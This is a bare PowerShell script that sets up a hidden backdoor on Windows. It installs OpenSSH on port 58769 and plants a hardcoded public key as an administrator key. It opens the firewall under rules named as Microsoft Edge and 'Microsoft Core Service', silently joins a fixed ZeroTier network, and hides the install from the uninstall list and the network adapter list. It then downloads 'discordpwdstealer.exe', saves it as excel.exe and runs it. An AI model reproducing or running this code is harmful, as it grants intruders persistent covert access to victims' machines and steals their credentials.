#Set-ExecutionPolicy AllSigned
$TempDir = [System.IO.Path]::GetTempPath() 
$InstallPath = "C:\Program Files\OpenSSH"
$DisablePasswordAuthentication = $True
$DisablePubkeyAuthentication = $False
$AutoStartSSHD = $true
$AutoStartSSHAGENT = $false
$OpenSSHLocation = $null
#$OpenSSHLocation = '\\server\c$\OpenSSH\OpenSSH-Win64.zip'
$GitUrl = 'https://github.com/PowerShell/Win32-OpenSSH/releases/latest/'
$GitZipName = "OpenSSH-Win64.zip"
$FilePath = "$TempDir\$GitZipName"
if (Test-Path $FilePath) {
    Remove-Item $FilePath -Force
}
$ErrorActionPreference = "SilentlyContinue"
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
$ErrorActionPreference = "SilentlyContinue"
if ($(Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -eq "Installed") {
    Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null
}
if ($(Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0).State -eq "Installed") {
    Remove-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null
}
$ErrorActionPreference = "SilentlyContinue"
if (Get-Service sshd -ErrorAction SilentlyContinue) {
    Stop-Service sshd -ErrorAction SilentlyContinue
    sc.exe delete sshd 1>$null | Out-Null
}
if (Get-Service ssh-agent -ErrorAction SilentlyContinue) {
    Stop-Service ssh-agent -ErrorAction SilentlyContinue
    sc.exe delete ssh-agent 1>$null | Out-Null
}
if ($OpenSSHLocation.Length -eq 0) {
    $GitUrl += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $request = [System.Net.WebRequest]::Create($GitUrl)
    $request.AllowAutoRedirect = $false
    $request.Timeout = 5 * 1000
    $request.headers.Add("Pragma", "no-cache")
    $request.headers.Add("Cache-Control", "no-cache")
    $request.UserAgent = $UserAgent
    $response = $request.GetResponse()
    if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
    $OpenSSHURL = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $GitZipName
    $OpenSSHURL += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
    Invoke-WebRequest -Uri $OpenSSHURL -OutFile "$FilePath" -ErrorAction SilentlyContinue -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent
}
else {
    $PathInfo = [System.Uri]([string]::":FileSystem::" + $OpenSSHLocation) | Out-Null
    if ($PathInfo.IsUnc) {
        Copy-Item -Path $PathInfo.LocalPath -Destination $env:TEMP | Out-Null
        Set-Location $env:TEMP | Out-Null
    }
}
Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
If (!(Test-Path $InstallPath)) {
    New-Item -Path $InstallPath -ItemType "directory"-Force -ErrorAction SilentlyContinue | Out-Null
}
$OldEnv = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $(Get-Location)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
$archive.Entries | ForEach-Object {
    if ($_.Name -ne '') {
        $NewFIleName = Join-Path $InstallPath $_.Name
        Remove-Item -Path $NewFIleName -Force -ErrorAction SilentlyContinue
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, $NewFIleName)
    }
}
$archive.Dispose()
Set-Location $OldEnv | Out-Null
if ($OpenSSHURL.Length -gt 0) { Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue  | Out-Null}
Set-Location $InstallPath -ErrorAction SilentlyContinue | Out-Null
powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1 | Out-Null
Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction SilentlyContinue
If (!(Test-Path $env:ProgramData\ssh)) {
   New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction SilentlyContinue | Out-Null
}
Copy-Item -Path $InstallPath\sshd_config_default -Destination $env:ProgramData\ssh\sshd_config -Force -ErrorAction SilentlyContinue | Out-Null
Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction SilentlyContinue | Out-Null
if ($DisablePasswordAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PasswordAuthentication no" -ErrorAction SilentlyContinue | Out-Null } 
if ($DisablePubkeyAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PubkeyAuthentication no" -ErrorAction SilentlyContinue | Out-Null }
$sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
$sshdConfigContent = Get-Content -Path $sshdConfigPath
$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58769"
$sshdConfigContent | Set-Content -Path $sshdConfigPath
If (!(Test-Path "~\.ssh")) {
    New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction SilentlyContinue | Out-Null
}
if ($AutoStartSSHD) {
    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue;
}
if ($AutoStartSSHAGENT) {
    Set-Service -Name ssh-agent -StartupType Automatic -ErrorAction SilentlyContinue;
}
Start-Service sshd -ErrorAction SilentlyContinue > $null
$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path | Out-Null
if ($existingPath -notmatch $InstallPath.Replace("\", "\\") | Out-Null) {
    $newpath = "$existingPath;$InstallPath" | Out-Null
    Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction SilentlyContinue | Out-Null
}
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixHostFilePermissions.ps1 -Confirm:$false' | Out-Null
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false' | Out-Null
New-NetFirewallRule -Program  "C:\Program Files\OpenSSH\sshd.exe" -Action Allow -Profile Domain, Private, Public -DisplayName "Microsoft Edge browser" -Description "Allow Microsoft Edge browser" -Direction Inbound -ErrorAction SilentlyContinue | Out-Null
New-NetFirewallRule -Name Microsoft-Core -DisplayName 'Microsoft Core Service' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 58769 -ErrorAction SilentlyContinue | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
Set-Location -Path $PSScriptRoot | Out-Null
$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\ProgramData\ssh\administrators_authorized_keys"  -PathType leaf ))) {
        Set-Content -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Value $SSHPublicKey  | Out-Null
    }
    $acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
    $acl.SetAccessRuleProtection($true, $false)
    $administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
    $systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
    $acl.SetAccessRule($administratorsRule)
    $acl.SetAccessRule($systemRule)
    $acl | Set-Acl
$TempDir = [System.IO.Path]::GetTempPath()
$scriptDirectory = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
$tempMsiPath = Join-Path -Path $TempDir -ChildPath "temp_layer1fixzt.msi"
$finalMsiPath = Join-Path -Path $scriptDirectory -ChildPath "layer1fixzt.msi"
if (-not (Test-Path $finalMsiPath)) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $downloadUrl = "https://download.zerotier.com/dist/ZeroTier%20One.msi"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempMsiPath
    Set-ItemProperty -Path $tempMsiPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    Move-Item -Path $tempMsiPath -Destination $finalMsiPath -Force
}
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$finalMsiPath`" /qn /norestart"
Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
Start-Sleep -Seconds 10
$NetworkID = "52b337794f5f54e7"
$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
$param1 = "-q"
$param2 = "join"
& $zerotiercli $param1 $param2 $NetworkID allowDefault=1 | Out-Null
$KeyNamePattern = "Zerotier*"
$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
foreach ($Key in $MatchingKeys) {
    $RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
    $RegValueName = "SystemComponent"
    $RegValueData = 1
    Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
}
$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
if (Test-Path $ZeroTierShortcutPath) {
    Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
}
Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
$folderPath = "C:\Program Files (x86)\ZeroTier"
$folderACL = Get-Acl -Path $folderPath
$folderACL.SetAccessRuleProtection($true, $false)
$folderACL.Access | ForEach-Object {
    $folderACL.RemoveAccessRule($_)
}
Set-Acl -Path $folderPath -AclObject $folderACL
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
Set-Acl -Path $folderPath -AclObject $folderACL
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    $currentUser,
    "FullControl",
    "ContainerInherit, ObjectInherit",
    "None",
    "Allow"
)
$folderACL.AddAccessRule($accessRule)
Set-Acl -Path $folderPath -AclObject $folderACL
$childItems = Get-ChildItem -Path $folderPath -Recurse
foreach ($item in $childItems) {
    Set-Acl -Path $item.FullName -AclObject $folderACL
}
Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
$TempDir = [System.IO.Path]::GetTempPath()
$output = "$TempDir\excel.exe"
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
Timeout /NoBreak 10
Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -NoRestart | Out-Null
Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft